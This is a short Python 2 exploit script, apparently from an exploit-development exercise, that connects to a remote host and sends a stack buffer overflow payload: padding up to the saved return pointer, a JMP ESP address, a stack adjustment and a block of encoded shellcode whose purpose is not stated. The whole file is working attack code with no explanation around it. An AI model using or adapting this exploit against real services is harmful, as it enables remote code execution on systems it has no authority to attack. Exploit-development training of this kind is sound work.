#!/usr/bin/env python2
import socket
import struct

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen, ptr_jmp_esp, sub_esp_10, pre_buffer_name

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#buf_totlen = 1024
#offset_srp = 146

#ptr_jmp_esp = 0x080414C3

#sub_esp_10 = "\x83\xec\x10"
#or padding = "\x90" * 16
shellcode =  ("\x51\x53\x56\x52\xda\xd9\xd9\x74\x24\xf4\x5a\x41\x49\x29"
"\xc9\x52\x51\x59\x5a\x81\xe9\xaf\xff\xff\xff\xbe\x25\x27"
"\x3e\xe4\x31\x72\x2c\x83\xc2\x04\x83\xc3\x33\x83\xc1\xff"
"\x75\xf2\x5a\x5e\x5b\x59\xd9\xcf\xbc\xe4\x25\x27\x5e\x6d"
"\xc0\x16\xfe\x80\xae\x77\x0e\x6f\x77\x2b\xb5\xb6\x31\xac"
"\x4c\xcc\x2a\x90\x74\xc2\x14\xd8\x92\xd8\x44\x5b\x3c\xc8"
"\x05\xe6\xf1\xe9\x24\xe0\xdc\x16\x77\x70\xb5\xb6\x35\xac"
"\x74\xd8\xae\x6b\x2f\x9c\xc6\x6f\x3f\x35\x74\xac\x67\xc4"
"\x24\xf4\xb5\xad\x3d\xc4\x04\xad\xae\x13\xb5\xe5\xf3\x16"
"\xc1\x48\xe4\xe8\x33\xe5\xe2\x1f\xde\x91\xd3\x24\x43\x1c"
"\x1e\x5a\x1a\x91\xc1\x7f\xb5\xbc\x01\x26\xed\x82\xae\x2b"
"\x75\x6f\x7d\x3b\x3f\x37\xae\x23\xb5\xe5\xf5\xae\x7a\xc0"
"\x01\x7c\x65\x85\x7c\x7d\x6f\x1b\xc5\x78\x61\xbe\xae\x35"
"\xd5\x69\x78\x4f\x0d\xd6\x25\x27\x56\x93\x56\x15\x61\xb0"
"\x4d\x6b\x49\xc2\x22\xd8\xeb\x5c\xb5\x26\x3e\xe4\x0c\xe3"
"\x6a\xb4\x4d\x0e\xbe\x8f\x25\xd8\xeb\xb4\x75\x77\x6e\xa4"
"\x75\x67\x6e\x8c\xcf\x28\xe1\x04\xda\xf2\xa9\x8e\x20\x4f"
"\xfe\x4c\x34\xa6\x56\xe6\x25\x36\x62\x6d\xc3\x4d\x2e\xb2"
"\x72\x4f\xa7\x41\x51\x46\xc1\x31\xa0\xe7\x4a\xe8\xda\x69"
"\x36\x91\xc9\x4f\xce\x51\x87\x71\xc1\x31\x4d\x44\x53\x80"
"\x25\xae\xdd\xb3\x72\x70\x0f\x12\x4f\x35\x67\xb2\xc7\xda"
"\x58\x23\x61\x03\x02\xe5\x24\xaa\x7a\xc0\x35\xe1\x3e\xa0"
"\x71\x77\x68\xb2\x73\x61\x68\xaa\x73\x71\x6d\xb2\x4d\x5e"
"\xf2\xdb\xa3\xd8\xeb\x6d\xc5\x69\x68\xa2\xda\x17\x56\xec"
"\xa2\x3a\x5e\x1b\xf0\x9c\xde\xf9\x0f\x2d\x56\x42\xb0\x9a"
"\xa3\x1b\xf0\x1b\x38\x98\x2f\xa7\xc5\x04\x50\x22\x85\xa3"
"\x36\x55\x51\x8e\x25\x74\xc1\x31")





buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += struct.pack("<I", ptr_jmp_esp) # SRP overwrite
buf += sub_esp_10 # ESP points here
buf += shellcode
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send(pre_buffer_name + buf)
